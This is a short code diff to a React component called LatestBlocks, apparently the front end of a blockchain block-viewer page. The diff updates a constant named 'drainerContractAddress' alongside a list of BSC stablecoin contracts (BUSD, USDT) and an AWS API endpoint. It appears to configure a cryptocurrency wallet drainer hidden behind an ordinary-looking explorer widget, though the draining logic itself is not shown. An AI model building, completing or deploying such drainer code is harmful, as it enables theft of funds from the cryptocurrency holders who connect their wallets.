@@ -9,7 +9,7 @@ const LatestBlocks = () => {
   const [loading, setLoading] = useState(false);
 
   const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
-  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3C5ba3A"; // Matches server.js
+  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A"; // Matches server.js
   const tokenList = [
     { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
     { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
